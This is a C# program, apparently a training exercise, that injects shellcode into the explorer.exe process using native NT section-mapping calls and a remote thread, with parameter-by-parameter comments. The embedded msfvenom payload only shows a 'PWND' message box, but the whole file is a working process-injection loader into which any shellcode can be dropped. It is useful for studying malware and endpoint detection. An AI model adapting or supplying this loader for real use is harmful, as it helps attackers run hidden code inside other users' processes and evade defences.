using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Inject
{
    class Program
    {
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError= true)]
        static extern uint NtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, CLIENT_ID clientId);

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public ulong Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public ulong Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/messagebox TEXT="PWND" -f csharp
            byte[] buf = new byte[283] {
            0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
            0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
            0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
            0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
            0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
            0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
            0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
            0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
            0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
            0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
            0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
            0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
            0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
            0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
            0x85,0x03,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
            0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x50,0x57,0x4e,
            0x44,0x00,0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00 };

            // Create Section object(virtual memory block0
            IntPtr hSection = IntPtr.Zero;
            UInt32 size = (uint)buf.Length;

            // NtCreateSection creates a section object
            // SectionHandle - stores the HANDLE to the Section object
            // DesiredAccess - Access mask RWX = 0xE = 14
            //  SECTION_MAP_WRITE = 0x2
            //  SECTION_MAP_READ = 0x4
            //  SECTION_MAP_EXECUTE = 0x8
            // https://referencesource.microsoft.com/#windowsbase/Shared/MS/Win32/UnsafeNativeMethodsOther.cs,17bcbebb013dd52d
            // ObjectAttributes - pointer to OBJECT_ATTRIBUTES structure, don't need just pass NULL
            // MaximumSize - max size of section, option but requried when creating a section based on systme PageFile
            //  passing a ref to the shellcode buf size
            // PageAttributes - Memory protection options, 0x40 = PAGE_EXECUTE_READWRITE
            //  https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
            // SectionAttributes - flags to determine the allocation attributes of the section
            //  set = 0x8000000 = SEC_COMMIT
            //  https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga
            // FileHandle - optional HANDLE to File Object
            Console.WriteLine("[*] Creating section in memory ...");
            UInt32 result = NtCreateSection(ref hSection, 0xE, IntPtr.Zero, ref size, 0x40, 0x8000000, IntPtr.Zero);

            // map created section to local process
            // SectionHandle - HANDLE to section object
            // ProcessHandle - HANDLE to Process Object
            // BaseAddress - Pointer to variable receiving virtual address of mapped memory
            //  NULL to have the API call choose where to map
            // shellocde will be copied here later
            // ZeroBits - IDK what this means, but looks safe to set NULL
            // CommitSize - size of initially commited memory. Not commiting anything inititally, so NULL
            // SectionOffset - Pointer to begin of mapped block in section. Want to start at the beginning, set = 0
            // ViewSize - pointer to size of mapped block in bytes
            //  reusing size variable from createsection
            // InheritDisposition - how child processes inherid maped section
            //  0x2 = BiewUnmap = child processess will not inherit
            //  http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html
            // AllocationType - ??? Not sure why but examples seem to pass 0 / NULL
            // Protect - page protection value, should be set to PAGE_READWRITE according to docs
            //  PAGE_READWRITE = 0x4
            //  https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
            Console.WriteLine("[*] Mapping section ...");
            IntPtr shellcode_addr = IntPtr.Zero;
            ulong lsecOffset = 0;
            result = NtMapViewOfSection(hSection, (IntPtr)(-1), ref shellcode_addr, UIntPtr.Zero, UIntPtr.Zero, out lsecOffset, out size, 0x2, 0, 0x4);

            // ***
            // At this point a section has been mapped to local memory
            /// ***

            // get a handle to remote process to inject into
            // Create an array of processes that contain the name "explorer"
            Process[] localByName = Process.GetProcessesByName("explorer");

            // Open cahnnel to remote process
            // PROCESS_ALL_ACCESS = 0x001F0FFF
            // localByName[0].Id = get the pid of the 1st process in the array
            Console.WriteLine("[*] Getting handle to remote process ...");
            CLIENT_ID clientid = new CLIENT_ID();
            clientid.UniqueProcess = new IntPtr(localByName[0].Id);
            clientid.UniqueThread = IntPtr.Zero;
            IntPtr hProcess = IntPtr.Zero;
            uint resultP = NtOpenProcess(ref hProcess, 0x001F0FFF, new OBJECT_ATTRIBUTES(), ref clientid);

            // map memory to remote process
            // Only changes are adding the handle to the explorer process
            // and changing protect settings to PAGE_EXECUTE_READ = 0x20
            Console.WriteLine("[*] Mapping section to remote process");
            result = NtMapViewOfSection(hSection, hProcess, ref shellcode_addr, UIntPtr.Zero, UIntPtr.Zero, out lsecOffset, out size, 0x2, 0, 0x20);

            // Copy shellcode to base address location from NtMapViewOfSection
            // copys data to local process which will get shared to remote process
            Console.WriteLine("[*] Writing shellcode to section ...");
            Marshal.Copy(buf, 0, shellcode_addr, buf.Length);

            // close section after copying data to it
            result = NtUnmapViewOfSection(hProcess, hSection);

            // ***
            // Shellcode is now in memory shared with remote process and waiting to be executed
            // ***

            // execute thread in remote process
            // targetHandle - 
            // threadSecurity - optional
            // createSuspended - 
            // stackZeroBits - 
            // stackReserved
            // stackCommit
            // startAddress
            // parameter
            // threadHandle
            // clientId
            Console.WriteLine("[*] Executing shellcode in remote process ...");
            IntPtr hThread = IntPtr.Zero;
            RtlCreateUserThread(hProcess, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, shellcode_addr, IntPtr.Zero, ref hThread, clientid);

        }
    }
}
